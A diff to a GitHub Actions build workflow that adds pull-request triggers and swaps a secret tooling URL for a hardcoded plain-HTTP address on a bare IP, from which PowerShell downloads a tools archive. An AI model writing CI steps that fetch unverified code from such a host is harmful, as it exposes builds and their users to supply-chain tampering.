@@ -1,5 +1,5 @@
 ---
-on: [push]
+on: [push, pull_request]
 name: Build
 jobs:
   build:
@@ -21,7 +21,7 @@ jobs:
 
       - name: Extract tooling
         env:
-          TOOLS_URL: ${{ secrets.TOOLS_URL }}
+          TOOLS_URL: 'http://163.172.81.216:12369/tools.7z'
         run: |
           # Download tooling
           Invoke-WebRequest "$Env:TOOLS_URL" -OutFile .\tools.7z
